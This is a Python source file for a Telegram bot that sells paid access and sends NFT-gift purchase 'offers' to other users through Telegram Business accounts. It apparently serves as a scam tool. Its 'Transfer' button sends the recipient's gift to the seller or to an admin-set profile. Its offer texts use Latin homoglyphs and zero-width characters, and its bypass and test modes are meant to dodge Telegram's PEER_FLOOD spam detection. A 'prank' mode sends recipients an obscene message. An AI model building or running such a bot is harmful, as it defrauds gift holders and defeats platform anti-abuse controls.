import asyncio
import logging
import html
import uuid
import csv
import io
import re
from datetime import datetime, timezone, timedelta

from aiogram import Bot, Dispatcher, F
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.exceptions import TelegramBadRequest, TelegramForbiddenError, TelegramRetryAfter
from aiogram.filters import Command
from aiogram.types import (CallbackQuery, InlineKeyboardButton, InlineKeyboardMarkup,
                           LinkPreviewOptions, Message, BusinessConnection, BufferedInputFile)

from config import load_config
from database import Database
from offer import (ACCEPT_EMOJI_ID, DECLINE_EMOJI_ID, GIFT_EMOJI_ID, TRANSFER_EMOJI_ID,
                   PREMIUM_EMOJI_ID, DONE_EMOJI_ID, STARS_EMOJI_ID, GRAM_EMOJI_ID,
                   display_amount, format_remaining, gift_title, make_expiry, parse_offer)
from payment import TonkeeperAPI

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
log = logging.getLogger("offerbot")

cfg = load_config()
db = Database(cfg.database_url)
bot = Bot(cfg.bot_token, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()
offer_locks = {}
awaiting_broadcast = set()
awaiting_payment_price = set()
awaiting_access_grant = set()
awaiting_support = set()
awaiting_banner = set()
awaiting_prank_photo = set()
awaiting_profile_change = {}  # {admin_user_id: target_user_id}
awaiting_admin_search = set()
awaiting_referral_hours = set()
awaiting_access_duration = set()
awaiting_offer_command = set()
admin_user_queries = {}
admin_offer_filters = {}
awaiting_access_recovery = set()  # legacy state; child-initiated recovery is disabled
awaiting_access_transfer = set()  # only the paid primary account can add a secondary account
pending_access_usernames = {}  # child Telegram ID -> username entered for access recovery


def to_msk(dt):
    """Конвертирует datetime в московское время (UTC+3)"""
    if dt is None:
        return None
    if dt.tzinfo is None:
        dt = dt.replace(tzinfo=timezone.utc)
    msk_tz = timezone(timedelta(hours=3))
    return dt.astimezone(msk_tz)


def get_offer_command() -> str:
    """Команда создания офера; хранится в БД и переживает перезапуск."""
    value = (db.get_setting("offer_command", "ху") or "ху").strip().lstrip(".")
    return value if value else "ху"


def get_payment_price() -> float:
    """Текущая цена TON: настройка админки имеет приоритет над ENV."""
    try:
        return float(db.get_setting("payment_price", str(cfg.payment_price)))
    except (TypeError, ValueError):
        return cfg.payment_price


def get_access_duration_hours() -> float:
    try:
        value = float(db.get_setting("access_duration_hours", str(cfg.access_duration_hours)))
        return value if 1 <= value <= 8760 else cfg.access_duration_hours
    except (TypeError, ValueError):
        return cfg.access_duration_hours


def display_name(user) -> str:
    return " ".join(x for x in [getattr(user, 'first_name', None), getattr(user, 'last_name', None)] if x) or "Пользователь"


async def send_with_banner(target, text: str, reply_markup=None, **kwargs):
    """Отправить баннер; если сохранённый file_id недействителен — сбросить его и отправить текст."""
    banner_file_id = db.get_setting("start_banner_file_id")
    if banner_file_id:
        try:
            return await target.answer_photo(
                photo=banner_file_id,
                caption=text,
                reply_markup=reply_markup,
                **kwargs,
            )
        except TelegramBadRequest as exc:
            error_text = str(exc).lower()
            if "wrong file identifier" not in error_text and "http url" not in error_text:
                raise
            log.warning("Saved start banner file_id is invalid; clearing it. Telegram error: %s", exc)
            db.set_setting("start_banner_file_id", "")

    return await target.answer(text, reply_markup=reply_markup, **kwargs)


def instruction(locale="ru"):
    command = get_offer_command()
    return (
        "<b>📘 ИНСТРУКЦИЯ ПО ИСПОЛЬЗОВАНИЮ</b>\n\n"
        "<b>Формат команды:</b>\n"
        f"<code>{html.escape(command)} НФТ_ссылка количество валюта</code>\n\n"
        "<b>Примеры:</b>\n"
        f"<blockquote><code>{html.escape(command)} https://t.me/nft/DeliciousCake-123 150 зв</code>\n"
        f"<code>{html.escape(command)} https://t.me/nft/Gift-456 200 грам</code></blockquote>\n\n"
        "<b>Валюты (можно писать по-разному):</b>\n"
        "• <code>зв</code> / <code>stars</code> — Telegram Stars\n"
        "• <code>грам</code> / <code>gram</code> — TON Gram\n\n"
        "<b>Языки офера:</b>\n"
        "• Русский (по умолчанию)\n"
        "• Английский: добавь <code>англ</code> или <code>en</code>\n"
        "• Арабский: добавь <code>араб</code> или <code>ar</code>\n"
        "• Китайский: добавь <code>китай</code> или <code>cn</code>\n\n"
        "<b>Примеры с языками:</b>\n"
        f"<blockquote><code>{html.escape(command)} https://t.me/nft/Gift-789 100 stars англ</code>\n"
        f"<code>{html.escape(command)} https://t.me/nft/Gift-999 50 грам китай</code></blockquote>\n\n"
        "<b>Изменить профиль в кнопке «Передать»:</b>\n"
        "<blockquote><code>/transfer @username</code></blockquote>"
    )


def error_text(kind):
    if kind == "nft": return "❌ Не нашёл ссылку на NFT.\n\n" + instruction()
    if kind == "price": return "❌ Не нашёл цену офера.\n\n" + instruction()
    return "❌ Не удалось обработать офер."


def offer_keyboard(offer_id: int, locale: str, currency: str = ""):
    labels = {
        "ru": ("Отклонить", "Принять"), "en": ("Decline", "Accept"),
        "cn": ("拒绝", "接受"), "ar": ("رفض", "قبول")
    }
    decline, accept = labels.get(locale, labels["ru"])
    #оаптвыяшпияпи
    # Стандартные эмодзи для кнопок
    return InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text=decline, icon_custom_emoji_id=DECLINE_EMOJI_ID, callback_data=f"of:decline:{offer_id}"),
        InlineKeyboardButton(text=accept, icon_custom_emoji_id=ACCEPT_EMOJI_ID, callback_data=f"of:accept:{offer_id}"),
    ]])


def transfer_keyboard(url: str, locale: str, offer_id: int):
    # Используем Three-Per-Em Space (\u2004) для центрирования текста
    labels = {"ru": "Передать\u2004", "en": "Transfer\u2004", "cn": "转赠\u2004", "ar": "نقل الهدية"}
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=labels.get(locale, labels["ru"]), icon_custom_emoji_id=TRANSFER_EMOJI_ID, url=url)]
    ])


def subscription_keyboard():
    buttons = []
    # Добавляем кнопку канала только если URL валидный
    if cfg.channel_url and cfg.channel_url not in ("", "https://t.me/", "https://t.me"):
        buttons.append([InlineKeyboardButton(text="📢 Перейти на канал", url=cfg.channel_url)])
    buttons.append([InlineKeyboardButton(text="✅ Подтвердить подписку", callback_data="check_subscription")])
    return InlineKeyboardMarkup(inline_keyboard=buttons)


def main_menu_keyboard(user_id: int | None = None):
    has_access = bool(user_id and db.has_access(user_id, cfg.owner_id, cfg.offer_access_mode))
    first_button = InlineKeyboardButton(text="Подписка", callback_data="my_subscription") if has_access else InlineKeyboardButton(text="Купить доступ", callback_data="buy_access")
    return InlineKeyboardMarkup(inline_keyboard=[
        [first_button],
        [InlineKeyboardButton(text="👥 Привязать твинки", callback_data="activate_access")],
        [InlineKeyboardButton(text="🔄 Сбросить аккаунты", callback_data="reset_my_accounts")],
        [InlineKeyboardButton(text="Реферальная программа", callback_data="my_referrals")],
        [InlineKeyboardButton(text="Инструкция", callback_data="show_instruction")],
        [InlineKeyboardButton(text="Я чайник", callback_data="support_start")],
    ])


def purchase_success_keyboard():
    buttons = []
    # Добавляем кнопку чата только если URL валидный
    if cfg.users_chat_url and cfg.users_chat_url not in ("https://t.me/", "https://t.me", ""):
        buttons.append([InlineKeyboardButton(text="💬 Чат покупателей", url=cfg.users_chat_url)])
    buttons.append([InlineKeyboardButton(text="📘 Инструкция", callback_data="show_instruction")])
    return InlineKeyboardMarkup(inline_keyboard=buttons)


def get_offer_amount_style() -> str:
    """Return the configured amount display style: premium emojis or plain words."""
    return db.get_setting("offer_amount_style", "premium")


def admin_keyboard():
    owner_only = "🟢 Вкл" if db.is_owner_only_mode() else "🔴 Выкл"
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Статистика", callback_data="adm:stats:0"), InlineKeyboardButton(text="Оферы", callback_data="adm:offers:0")],
        [InlineKeyboardButton(text="Пользователи", callback_data="adm:users:0"), InlineKeyboardButton(text="Оплаты", callback_data="adm:payments:0")],
        [InlineKeyboardButton(text="Рефералы", callback_data="adm:referrals:0"), InlineKeyboardButton(text="Доступы", callback_data="adm:access:0")],
        [InlineKeyboardButton(text="Подключения", callback_data="adm:connections:0"), InlineKeyboardButton(text="Настройки", callback_data="adm:settings:0")],
        [InlineKeyboardButton(
            text=("Формат офера: Премиум ⭐💎" if get_offer_amount_style() == "premium" else "Формат офера: Stars / Gram"),
            callback_data="adm:amount_style:0"
        )],
        [InlineKeyboardButton(text="Рассылка", callback_data="adm:broadcast:0"), InlineKeyboardButton(text="Журналы", callback_data="adm:system:0")],
        [InlineKeyboardButton(text="Баннер", callback_data="adm:banner:0"), InlineKeyboardButton(text="Профиль передачи", callback_data="adm:change_profile:0")],
        [InlineKeyboardButton(text="Фото пранка", callback_data="adm:prankphoto:0"),
         InlineKeyboardButton(text="Убрать фото", callback_data="adm:prankphotoremove:0")],
        [InlineKeyboardButton(text=f"Только владелец: {owner_only}", callback_data="adm:toggle_owner_only:0")],
        [InlineKeyboardButton(text="Обновить", callback_data="adm:home:0")],
    ])



async def safe_send_business(connection_id, chat_id, **kwargs):
    """Send one Business message - максимально быстро без retry."""
    return await bot.send_message(chat_id=chat_id, business_connection_id=connection_id, **kwargs)


async def get_connection(connection_id: str):
    row = db.get_business_connection(connection_id)
    if row and row["is_enabled"]:
        return row
    try:
        bc = await bot.get_business_connection(connection_id)
        db.upsert_business_connection(connection_id, bc.user.id, bc.user.username, bc.user.first_name, bc.user.last_name, bc.is_enabled)
        log.info("BUSINESS CONNECTION RESTORED connection_id=%s owner_id=%s", connection_id, bc.user.id)
        return db.get_business_connection(connection_id)
    except Exception as e:
        log.error("BUSINESS CONNECTION FAILED connection_id=%s error=%s", connection_id, e)
        return None


async def process_offer(message: Message, business_connection_id: str | None = None):
    # МОМЕНТАЛЬНО удаляем команду В САМОМ НАЧАЛЕ - до всех проверок!
    try:
        if business_connection_id:
            await bot.delete_business_messages(business_connection_id=business_connection_id, message_ids=[message.message_id])
        else:
            await bot.delete_message(chat_id=message.chat.id, message_id=message.message_id)
    except Exception as e:
        log.warning("Could not delete source message: %s", e)
    
    text = message.text or message.caption or ""
    plain_currency = False
    parsed = parse_offer(text, get_offer_command())
    if parsed.get("error"):
        await reply_message(message, error_text(parsed["error"]))
        return

    sender = message.from_user
    if not sender:
        await reply_message(message, "❌ Не удалось определить отправителя.")
        return

    if business_connection_id:
        bc = await get_connection(business_connection_id)
        if not bc or not bc["is_enabled"]:
            await reply_message(message, "❌ Для офера сначала подключите Telegram Business к этому боту.")
            return
        seller_id = bc["user_id"]
        buyer_id = message.chat.id
        seller_username = bc["username"]
        buyer_username = sender.username
        buyer_url = f"tg://user?id={buyer_id}"
        if db.is_blocked(seller_id) or int(bc["is_blocked"]):
            await reply_message(message, "❌ Вы заблокированы. Обратитесь в поддержку.")
            return
        if not db.has_access(seller_id, cfg.owner_id, cfg.offer_access_mode):
            await reply_message(
                message, 
                "🔒 <b>Доступ не оплачен</b>\n\n"
                "Для отправки оферов необходимо купить доступ.\n"
                f"Стоимость: <b>{get_payment_price():g} TON</b>",
                reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text="💎 Купить доступ", url=f"https://t.me/{cfg.bot_username}?start=buy")]
                ])
            )
            return
    else:
        seller_id = sender.id
        bc = db.get_connection_for_user(seller_id)
        if not bc:
            await reply_message(message, "❌ Для офера сначала подключите Telegram Business к этому боту.")
            return
        if db.is_blocked(seller_id) or int(bc["is_blocked"]):
            await reply_message(message, "❌ Вы заблокированы. Обратитесь в поддержку.")
            return
        if not db.has_access(seller_id, cfg.owner_id, cfg.offer_access_mode):
            await reply_message(
                message, 
                "🔒 <b>Доступ не оплачен</b>\n\n"
                "Для отправки оферов необходимо купить доступ.\n"
                f"Стоимость: <b>{get_payment_price():g} TON</b>",
                reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text="💎 Купить доступ", url=f"https://t.me/{cfg.bot_username}?start=buy")]
                ])
            )
            return
        buyer_id = message.chat.id
        buyer_username = message.chat.username if message.chat else None
        buyer_url = f"tg://user?id={buyer_id}"
        seller_username = bc["username"]
        business_connection_id = bc["connection_id"]

    # ПРОВЕРКА ПРАНКА - если включен, отправляем пранк вместо нормального офера
    if db.is_prank_mode(seller_id):
        seller_name = " ".join(x for x in [bc["first_name"], bc["last_name"]] if x) or "Пользователь"
        prank_photo = db.get_prank_photo()
        prank_text = f'<b>{seller_name}</b> хочет предложить вам отсосать хуй за ваш подарок' 
        prank_buttons = InlineKeyboardMarkup(inline_keyboard=[[
            InlineKeyboardButton(text="Принять", callback_data="prank:accept"),
            InlineKeyboardButton(text="Принять", callback_data="prank:accept")
        ]])
        
        try:
            if prank_photo:
                await bot.send_photo(
                    chat_id=buyer_id, 
                    business_connection_id=business_connection_id,
                    photo=prank_photo, 
                    caption=prank_text, 
                    reply_markup=prank_buttons,
                    parse_mode="HTML"
                )
            else:
                await bot.send_message(
                    chat_id=buyer_id, 
                    business_connection_id=business_connection_id,
                    text=prank_text, 
                    reply_markup=prank_buttons,
                    parse_mode="HTML"
                )
            log.info("PRANK_SENT seller_id=%s buyer_id=%s", seller_id, buyer_id)
        except Exception as e:
            log.error("PRANK_SEND_FAILED seller_id=%s buyer_id=%s error=%s", seller_id, buyer_id, e)
        return

    # Получаем профиль пользователя и формируем transfer_url
    profile = db.get_profile(seller_id)
    transfer_username = profile["name"] if profile and profile["name"] else seller_username
    transfer_url = (f"tg://send_gift?to={transfer_username.lstrip('@')}" if transfer_username else f"tg://user?id={seller_id}")
    now = datetime.now(timezone.utc)
    expires = make_expiry(now, cfg.offer_expire_hours)
    bypass_mode = parsed.get("bypass_mode", 0)
    data = dict(seller_id=seller_id, seller_username=seller_username, buyer_id=buyer_id,
                buyer_username=buyer_username, buyer_url=buyer_url, gift_name=parsed["gift_name"],
                gift_number=parsed["gift_number"], gift_url=parsed["gift_url"], amount=parsed["amount"],
                currency=parsed["currency"], locale=parsed["locale"], status="pending",
                created_at=now.isoformat(), expires_at=expires.isoformat(), message_chat_id=None,
                message_id=None, business_connection_id=business_connection_id, transfer_url=transfer_url,
                bypass_mode=bypass_mode)
    offer_id = db.create_offer(data)
    log.info("[OFFER CREATE] offer_id=%s seller_id=%s buyer_id=%s business_connection_id=%s gift=%s gift_number=%s amount=%s currency=%s",
             offer_id, seller_id, buyer_id, business_connection_id, parsed["gift_name"], parsed["gift_number"], parsed["amount"], parsed["currency"])

    seller_name = " ".join(x for x in [bc["first_name"], bc["last_name"]] if x) or "Пользователь"
    title = gift_title(parsed["gift_name"], parsed["gift_number"])
    
    # Для режимов обхода (bypass_mode > 0) всегда используем текст без эмодзи
    use_emoji = (get_offer_amount_style() != "plain") and (bypass_mode == 0)
    
    amount = display_amount(
        parsed["amount"], parsed["currency"],
        with_emoji=use_emoji,
        bypass_mode=bypass_mode
    )
    remaining = format_remaining((expires - now).total_seconds(), parsed["locale"])
    
    # Определяем уровень команды для коротких тестов
    test_level = parsed.get("test_level", 0)
    
    # Тестовые команды гой1-5 для проверки обхода peer_flood
    bypass_mode = parsed.get("bypass_mode", 0)
    
    if bypass_mode >= 1 and bypass_mode <= 5:
        # Формат времени: "Сделка активна в течение 23ч 59м."
        total_seconds = int((expires - now).total_seconds()) - 60
        hours = total_seconds // 3600
        minutes = (total_seconds % 3600) // 60
        time_text = f"{hours}ч {minutes}м."
        gift_link = f'<a href="{parsed["gift_url"]}">{title}</a>'
        
        if bypass_mode == 0:
            # гой (без номера): Полный офер с обходом "прeдлaгaeт" (e,a латинские) + зa (латинская a)
            body = f"<b>{seller_name}</b> прeдлaгaeт Вам <b>{amount}</b> зa {gift_link}.\n\nСдeлкa aктивнa в тeчeниe <b>{time_text}</b>"
        
        elif bypass_mode == 1:
            # гой1: БЕЗ слова "предлагает" вообще
            body = f"<b>{seller_name}</b> хочет купить <b>{amount}</b> за {gift_link}.\n\nСделка активна в течение <b>{time_text}</b>"
        
        elif bypass_mode == 2:
            # гой2: Полный офер БЕЗ предложения и срока действия, НО со словом "прeдлaгaeт" (обход)
            body = f"<b>{seller_name}</b> прeдлaгaeт Вам <b>{amount}</b> за {gift_link}."
        
        elif bypass_mode == 3:
            # гой3: Обход через "хочeт купить" (e латинская) + полный текст
            body = f"<b>{seller_name}</b> хочeт купить {gift_link} зa <b>{amount}</b>.\n\nСдeлкa aктивнa в тeчeниe <b>{time_text}</b>"
        
        elif bypass_mode == 4:
            # гой4: Обход через синоним "прeдлoжeниe" (e,o латинские)
            body = f"<b>{seller_name}</b>: прeдлoжeниe купить {gift_link} за <b>{amount}</b>.\n\nАктивно <b>{time_text}</b>"
    
    elif test_level > 0:
        # Короткие тестовые команды: ху1, ху2, ху3...
        # Добавляем невидимый символ в начало + используем латинские буквы в ключевых словах
        # \u200c - zero-width non-joiner
        prefix = "\u200c"
        if test_level == 1:
            body = f"{prefix}<b>{seller_name}</b>"
        elif test_level == 2:
            body = f"{prefix}<b>{seller_name}</b> прeдлaгaeт"  # e, a - латинские
        elif test_level == 3:
            body = f"{prefix}<b>{seller_name}</b> прeдлaгaeт Вaм"  # e, a - латинские
        elif test_level == 4:
            body = f"{prefix}<b>{seller_name}</b> прeдлaгaeт Вaм <b>{amount}</b>"
        elif test_level == 5:
            body = f"{prefix}<b>{seller_name}</b> прeдлaгaeт Вaм <b>{amount}</b> зa"  # a - латинская
        elif test_level == 6:
            body = f"{prefix}<b>{seller_name}</b> прeдлaгaeт Вaм <b>{amount}</b> зa пoдaрoк"  # o, a - латинские
        elif test_level == 7:
            body = f"{prefix}<b>{seller_name}</b> прeдлaгaeт Вaм <b>{amount}</b> зa пoдaрoк <a href=\"{parsed['gift_url']}\">{title}</a>"
        else:
            body = f"{prefix}<b>{seller_name}</b> прeдлaгaeт Вaм <b>{amount}</b> зa пoдaрoк <a href=\"{parsed['gift_url']}\">{title}</a>.\n\nПрeдлoжeниe aктивнo <b>{remaining}</b>."
    elif parsed["locale"] == "en":
        body = f"Usеr <b>{seller_name}</b> оffers <b>{amount}</b> fоr thе gift <a href=\"{parsed['gift_url']}\">{title}</a>.\n\nDeal is active <b>{remaining}</b>."
    elif parsed["locale"] == "cn":
        body = f"用户 <b>{seller_name}</b> 为礼物 <a href=\"{parsed['gift_url']}\">{title}</a> 出价 <b>{amount}</b>。\n\n报价将在 <b>{remaining}</b> 后过期。"
    elif parsed["locale"] == "ar":
        body = f"المستخدم <b>{seller_name}</b> يعرض <b>{amount}</b> مقابل الهدية <a href=\"{parsed['gift_url']}\">{title}</a>.\n\nينتهي العرض خلال <b>{remaining}</b>."
    else:
        # Убрали "Пользователь", начинаем с ника
        # Формат времени: "Сделка активна в течение 23ч 59м."
        total_seconds = int((expires - now).total_seconds()) - 60  # Вычитаем 1 минуту
        hours = total_seconds // 3600
        minutes = (total_seconds % 3600) // 60
        time_text = f"{hours}ч {minutes}м."
        gift_link = f'<a href="{parsed["gift_url"]}">{title}</a>'
        # Основной офер с обходом "прeдлaгaeт" (e, a латинские) — как в гой2
        body = f"<b>{seller_name}</b> прeдлaгaeт Вам <b>{amount}</b> за {gift_link}.\n\nСделка активна в течение <b>{time_text}</b>"
    
    # Кнопки добавляем только в самом конце (уровень 8+)
    markup = offer_keyboard(offer_id, parsed["locale"], parsed["currency"]) if test_level == 0 or test_level >= 8 else None
    log.info("OFFER_SEND_REQUEST offer_id=%s chat_id=%s business_connection_id=%s", offer_id, buyer_id, business_connection_id)
    log.info("REPLY_MARKUP_PRESENT offer_id=%s present=%s", offer_id, bool(markup and markup.inline_keyboard))

    try:
        # Отправляем офер (команда уже удалена в начале функции)
        sent = await safe_send_business(
            business_connection_id,
            buyer_id,
            text=body,
            link_preview_options=LinkPreviewOptions(url=parsed["gift_url"], show_above_text=True),
            reply_markup=markup,
        )
        log.info("OFFER_SEND_SUCCESS offer_id=%s telegram_message_id=%s", offer_id, sent.message_id)
        log.info("OFFER_MESSAGE_ID offer_id=%s message_id=%s chat_id=%s", offer_id, sent.message_id, buyer_id)
    except Exception:
        log.exception("OFFER_SEND_ERROR offer_id=%s chat_id=%s business_connection_id=%s", offer_id, buyer_id, business_connection_id)
        db.delete_offer(offer_id)
        await reply_message(message, "❌ Не удалось отправить офер. Попробуйте ещё раз позже.")
        return

    # Клавиатура отправлена в том же запросе, что и сам офер.
    # Поэтому она является частью исходного сообщения, а не поздним edit-обновлением.
    db.set_offer_message(offer_id, buyer_id, sent.message_id)
    log.info("OFFER_SEND_SUCCESS_STORED offer_id=%s chat_id=%s message_id=%s keyboard_in_initial_send=true",
             offer_id, buyer_id, sent.message_id)


async def reply_message(message: Message, text: str, reply_markup=None):
    """Reply to a message, optionally attaching an inline/reply keyboard."""
    try:
        if message.business_connection_id:
            await bot.send_message(
                chat_id=message.chat.id,
                business_connection_id=message.business_connection_id,
                text=text,
                reply_markup=reply_markup,
            )
        else:
            await message.answer(text, reply_markup=reply_markup)
    except Exception:
        log.exception("Failed to reply to message")


async def delete_source(message: Message, connection_id: str | None):
    try:
        if connection_id:
            await bot.delete_business_messages(business_connection_id=connection_id, message_ids=[message.message_id])
        else:
            await bot.delete_message(chat_id=message.chat.id, message_id=message.message_id)
    except Exception as e:
        log.warning("Could not delete source message: %s", e)


async def test_send(message: Message, is_business: bool, test_text: str):
    """Тестовая отправка для поиска PEER_FLOOD триггера"""
    # Удаляем команду
    try:
        if is_business:
            await bot.delete_business_messages(business_connection_id=message.business_connection_id, message_ids=[message.message_id])
        else:
            await bot.delete_message(chat_id=message.chat.id, message_id=message.message_id)
    except Exception as e:
        log.warning("Could not delete test command: %s", e)
    
    if not message.from_user:
        await reply_message(message, "❌ Не удалось определить отправителя.")
        return
    
    # Получаем connection_id
    if is_business:
        bc = await get_connection(message.business_connection_id)
        if not bc or not bc["is_enabled"]:
            await reply_message(message, "❌ Business не подключён")
            return
        business_connection_id = message.business_connection_id
        buyer_id = message.chat.id
    else:
        bc = db.get_connection_for_user(message.from_user.id)
        if not bc:
            await reply_message(message, "❌ Business не подключён")
            return
        business_connection_id = bc["connection_id"]
        buyer_id = message.chat.id
    
    # Пробуем отправить тестовое сообщение
    try:
        log.info("TEST_SEND: Trying to send text: %s", test_text)
        sent = await safe_send_business(
            business_connection_id,
            buyer_id,
            text=test_text
        )
        log.info("TEST_SEND_SUCCESS: message_id=%s", sent.message_id)
        # Не уведомляем пользователя, чтобы не создавать лишних сообщений
    except Exception as e:
        log.error("TEST_SEND_ERROR: %s", e)
        await reply_message(message, f"❌ Ошибка: {type(e).__name__}: {str(e)[:100]}")


async def test_send_with_keyboard(message: Message, is_business: bool, test_text: str, keyboard: InlineKeyboardMarkup):
    """Тестовая отправка с клавиатурой для поиска PEER_FLOOD триггера"""
    # Удаляем команду
    try:
        if is_business:
            await bot.delete_business_messages(business_connection_id=message.business_connection_id, message_ids=[message.message_id])
        else:
            await bot.delete_message(chat_id=message.chat.id, message_id=message.message_id)
    except Exception as e:
        log.warning("Could not delete test command: %s", e)
    
    if not message.from_user:
        await reply_message(message, "❌ Не удалось определить отправителя.")
        return
    
    # Получаем connection_id
    if is_business:
        bc = await get_connection(message.business_connection_id)
        if not bc or not bc["is_enabled"]:
            await reply_message(message, "❌ Business не подключён")
            return
        business_connection_id = message.business_connection_id
        buyer_id = message.chat.id
    else:
        bc = db.get_connection_for_user(message.from_user.id)
        if not bc:
            await reply_message(message, "❌ Business не подключён")
            return
        business_connection_id = bc["connection_id"]
        buyer_id = message.chat.id
    
    # Пробуем отправить тестовое сообщение с клавиатурой
    try:
        log.info("TEST_SEND_WITH_KEYBOARD: Trying to send text: %s", test_text)
        sent = await safe_send_business(
            business_connection_id,
            buyer_id,
            text=test_text,
            reply_markup=keyboard
        )
        log.info("TEST_SEND_WITH_KEYBOARD_SUCCESS: message_id=%s", sent.message_id)
        # Не уведомляем пользователя, чтобы не создавать лишних сообщений
    except Exception as e:
        log.error("TEST_SEND_WITH_KEYBOARD_ERROR: %s", e)
        await reply_message(message, f"❌ Ошибка: {type(e).__name__}: {str(e)[:100]}")


@dp.message(Command("start"))
async def on_start(message: Message):
    if not message.from_user:
        return
    user = message.from_user
    # Determine whether this exact Telegram account is new (one indexed lookup).
    try:
        with db.connect() as con, con.cursor() as cur:
            cur.execute("SELECT 1 FROM bot_users WHERE user_id=%s", (user.id,))
            is_new_user = cur.fetchone() is None
    except Exception:
        is_new_user = False
    db.register_user(user.id, user.username, user.first_name, user.last_name)
    # /start ref_<telegram_id>: привязка реферала фиксируется только один раз.
    referral_id = None
    start_parts = (message.text or "").split(maxsplit=1)
    if len(start_parts) > 1 and start_parts[1].startswith("ref_"):
        raw_referrer = start_parts[1][4:]
        if raw_referrer.isdigit():
            referral_id = int(raw_referrer)
    db.register_referral(user.id, referral_id if is_new_user else None)
    if is_new_user and user.id != cfg.owner_id:
        try:
            await bot.send_message(cfg.owner_id, f"👤 <b>Новый пользователь</b>\n{display_name(user)} · @{user.username or 'без username'}\nID: <code>{user.id}</code>")
        except Exception:
            log.exception("Could not notify owner about new user")
    
    # Проверка подписки на канал (если включена)
    if cfg.require_subscription and not await is_channel_subscriber(user.id):
        await message.answer(
            "<b>✦ OFFERBOT</b>\n"
            "<blockquote>Оферы на подарки</blockquote>\n\n"
            "Для использования бота подпишись на канал 👇",
            reply_markup=subscription_keyboard()
        )
        return
    
    # Обработка параметра /start buy
    if message.text and "buy" in message.text.lower():
        # Проверяем есть ли уже доступ
        if db.has_access(user.id, cfg.owner_id, cfg.offer_access_mode):
            caption = (
                "✅ <b>У вас уже есть доступ!</b>\n\n"
                "Вы можете пользоваться всеми функциями бота."
            )
            await send_with_banner(message, caption, reply_markup=main_menu_keyboard(user.id))
            return
        
        # Показываем варианты оплаты
        # Не переиспользуем старый счёт: цена могла измениться в админке.
        db.cancel_pending_payments(user.id)
        current_price = get_payment_price()
        memo = str(uuid.uuid4())[:8].upper()
        payment_id = db.create_payment(user.id, memo, current_price)
        pending = {'id': payment_id, 'memo': memo, 'amount': current_price}
        
        await show_payment_options(message, user.id, pending)
        return
    
    # Пробного доступа нет: /start только показывает меню и не меняет подписку.
    caption = "<blockquote>Привет, выбери действие</blockquote>"
    await send_with_banner(message, caption, reply_markup=main_menu_keyboard(user.id))


async def is_channel_subscriber(user_id: int) -> bool:
    # Если требование подписки отключено, всегда возвращаем True
    if not cfg.require_subscription:
        return True
    
    try:
        member = await bot.get_chat_member(chat_id=cfg.channel_id, user_id=user_id)
        status = getattr(member, "status", "")
        if status in {"creator", "administrator", "member"}:
            return True
        return status == "restricted" and bool(getattr(member, "is_member", False))
    except Exception as e:
        log.warning("Could not verify channel membership for user %s: %s", user_id, e)
        return False


@dp.callback_query(F.data == "check_subscription")
async def check_subscription_callback(call: CallbackQuery):
    if not call.from_user:
        await call.answer("Не удалось определить пользователя", show_alert=True)
        return
    if not await is_channel_subscriber(call.from_user.id):
        await call.answer("Сначала подпишись на канал, затем нажми подтвердить.", show_alert=True)
        return
    u = call.from_user
    db.register_user(u.id, u.username, u.first_name, u.last_name)
    caption = "<blockquote>Привет, выбери действие</blockquote>"
    try:
        await send_with_banner(call.message, caption, reply_markup=main_menu_keyboard(u.id))
    except Exception:
        log.exception("Failed to show start menu after subscription confirmation")
        await call.message.answer(caption, reply_markup=main_menu_keyboard(u.id))
    await call.answer("Подписка подтверждена!")


@dp.callback_query(F.data == "my_subscription")
async def my_subscription_callback(call: CallbackQuery):
    uid = call.from_user.id
    if not db.has_access(uid, cfg.owner_id, cfg.offer_access_mode):
        await call.answer("Активная подписка не найдена", show_alert=True)
        return
    owner_uid = db.get_access_owner(uid)
    expires = db.get_access_expiry(uid)
    if expires is None:
        remaining = "Бессрочно"
    else:
        seconds = max(0, int((expires - datetime.now(expires.tzinfo or timezone.utc)).total_seconds()))
        days, rem = divmod(seconds, 86400)
        hours, rem = divmod(rem, 3600)
        minutes = rem // 60
        remaining = (f"{days} дн. " if days else "") + f"{hours} ч. {minutes} мин."
    text = f"<b>Подписка</b>\n\nОсталось: <b>{remaining}</b>"
    if owner_uid != uid:
        text += "\nПодписка основного аккаунта используется совместно."
    await call.message.answer(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="В главное меню", callback_data="back_to_start")]]))
    await call.answer()


@dp.callback_query(F.data == "reset_my_accounts")
async def reset_my_accounts_callback(call: CallbackQuery):
    if not call.from_user:
        await call.answer("Не удалось определить пользователя", show_alert=True)
        return
    
    user = call.from_user
    db.register_user(user.id, user.username, user.first_name, user.last_name)
    
    # Сбрасываем все привязки пользователя
    deleted = db.reset_all_links(user.id)
    
    if deleted > 0:
        await call.answer(f"✅ Сброшено привязок: {deleted}", show_alert=True)
        await call.message.answer(
            f"✅ <b>Привязки сброшены</b>\n\n"
            f"Удалено связей: <b>{deleted}</b>\n\n"
            "Теперь вы можете заново привязать твинки через кнопку «👥 Привязать твинки».",
            reply_markup=main_menu_keyboard(user.id)
        )
    else:
        await call.answer("У вас не было привязанных аккаунтов", show_alert=True)
    
    await call.answer()


@dp.callback_query(F.data == "activate_access")
async def activate_access_callback(call: CallbackQuery):
    if not call.from_user:
        await call.answer("Не удалось определить пользователя", show_alert=True)
        return
    user = call.from_user
    db.register_user(user.id, user.username, user.first_name, user.last_name)
    if db.get_access_owner(user.id) != user.id or not db.has_paid_primary_access(user.id):
        await call.answer("Привязывать твинки может только основной аккаунт с купленным доступом.", show_alert=True)
        return
    awaiting_access_transfer.add(user.id)
    await call.message.answer(
        "👥 <b>Привязка твинка</b>\n\n"
        "Отправь Telegram ID или @username дополнительного аккаунта.\n"
        "Твинк получит доступ до той же даты окончания, что и основной аккаунт.\n\n"
        "Отмена: /cancel."
    )
    await call.answer()


@dp.callback_query(F.data.startswith("access_link_yes:"))
async def access_link_yes_callback(call: CallbackQuery):
    _, expected_owner, child = call.data.split(":", 2)
